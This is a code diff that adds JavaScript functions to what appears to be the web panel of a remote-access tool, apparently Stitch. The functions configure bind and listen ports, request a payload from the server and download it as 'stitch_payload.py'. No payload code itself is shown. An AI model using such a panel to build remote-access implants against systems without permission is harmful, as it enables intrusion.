@@ -1315,3 +1315,138 @@ function updateTargetIndicator(hostname, status) {
         <div class="indicator-value">${statusIcon} ${hostname}</div>
     `;
 }
+
+// Payload Generation Functions
+async function generatePayload() {
+    const form = document.getElementById('payloadForm');
+    const outputDiv = document.getElementById('payloadOutput');
+    const infoDiv = document.getElementById('payloadInfo');
+    
+    // Get form data
+    const enableBind = document.getElementById('enableBind').checked;
+    const bindHost = document.getElementById('bindHost').value.trim();
+    const bindPort = document.getElementById('bindPort').value;
+    const enableListen = document.getElementById('enableListen').checked;
+    const listenHost = document.getElementById('listenHost').value.trim();
+    const listenPort = document.getElementById('listenPort').value;
+    
+    // Validation
+    if (!enableBind && !enableListen) {
+        showToast('At least one mode (Bind or Listen) must be enabled', 'error');
+        return;
+    }
+    
+    // Show loading
+    infoDiv.innerHTML = '<div class="loading-spinner"></div><p>Generating payload...</p>';
+    outputDiv.style.display = 'block';
+    
+    try {
+        const response = await fetch('/api/generate-payload', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': getCSRFToken()
+            },
+            body: JSON.stringify({
+                enable_bind: enableBind,
+                bind_host: bindHost,
+                bind_port: parseInt(bindPort),
+                enable_listen: enableListen,
+                listen_host: listenHost,
+                listen_port: parseInt(listenPort)
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            infoDiv.innerHTML = `
+                <div class="success-box">
+                    <h4>✅ Payload Generated Successfully</h4>
+                    <p><strong>Size:</strong> ${formatBytes(result.payload_size)}</p>
+                    <p><strong>Configuration:</strong></p>
+                    <ul>
+                        ${result.config.enable_bind ? `<li>Bind: ${result.config.bind_host || 'any'}:${result.config.bind_port}</li>` : ''}
+                        ${result.config.enable_listen ? `<li>Listen: ${result.config.listen_host}:${result.config.listen_port}</li>` : ''}
+                    </ul>
+                </div>
+            `;
+            showToast('Payload generated successfully!', 'success');
+        } else {
+            infoDiv.innerHTML = `
+                <div class="error-box">
+                    <h4>❌ Generation Failed</h4>
+                    <p>${result.error}</p>
+                </div>
+            `;
+            showToast(`Generation failed: ${result.error}`, 'error');
+        }
+    } catch (error) {
+        infoDiv.innerHTML = `
+            <div class="error-box">
+                <h4>❌ Network Error</h4>
+                <p>${error.message}</p>
+            </div>
+        `;
+        showToast('Network error during generation', 'error');
+    }
+}
+
+async function downloadPayload() {
+    try {
+        const response = await fetch('/api/download-payload', {
+            headers: {
+                'X-CSRFToken': getCSRFToken()
+            }
+        });
+        
+        if (response.ok) {
+            const blob = await response.blob();
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'stitch_payload.py';
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+            
+            showToast('Payload downloaded successfully', 'success');
+        } else {
+            const error = await response.json();
+            showToast(`Download failed: ${error.error}`, 'error');
+        }
+    } catch (error) {
+        showToast('Download error occurred', 'error');
+    }
+}
+
+function resetPayloadForm() {
+    document.getElementById('enableBind').checked = true;
+    document.getElementById('bindHost').value = '';
+    document.getElementById('bindPort').value = '4433';
+    document.getElementById('enableListen').checked = true;
+    document.getElementById('listenHost').value = 'localhost';
+    document.getElementById('listenPort').value = '4455';
+    document.getElementById('payloadOutput').style.display = 'none';
+}
+
+function copyPayloadInfo() {
+    const infoDiv = document.getElementById('payloadInfo');
+    const text = infoDiv.textContent || infoDiv.innerText;
+    
+    if (navigator.clipboard) {
+        navigator.clipboard.writeText(text).then(() => {
+            showToast('Payload info copied to clipboard', 'success');
+        });
+    } else {
+        // Fallback for older browsers
+        const textArea = document.createElement('textarea');
+        textArea.value = text;
+        document.body.appendChild(textArea);
+        textArea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textArea);
+        showToast('Payload info copied to clipboard', 'success');
+    }
+}
